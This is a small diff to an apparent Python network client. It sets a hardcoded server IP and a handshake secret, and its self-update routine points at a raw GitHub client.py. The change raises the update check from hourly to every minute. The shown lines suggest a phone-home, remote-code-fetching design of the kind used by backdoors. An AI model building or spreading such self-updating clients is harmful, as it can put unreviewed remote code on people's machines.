@@ -13,7 +13,7 @@ import uuid
 
 SYSTEM = platform.system()
 SERVER_PORT = 8080
-HANDSHAKE = b'CONNECT_v1_SECRET'  # должен совпадать
+HANDSHAKE = b'CONNECT_v1_SECRET'  # должен совпадать с сервером
 SERVER_IPS = ['26.109.130.211']
 UPDATE_URL = 'https://raw.githubusercontent.com/Malomanru/intructions/refs/heads/main/client.py'
 
@@ -73,7 +73,7 @@ def check_update():
 
 def _update_loop():
     while True:
-        time.sleep(3600)  # проверять каждый час
+        time.sleep(60)  # проверять каждую минуту
         check_update()
 
 check_update()
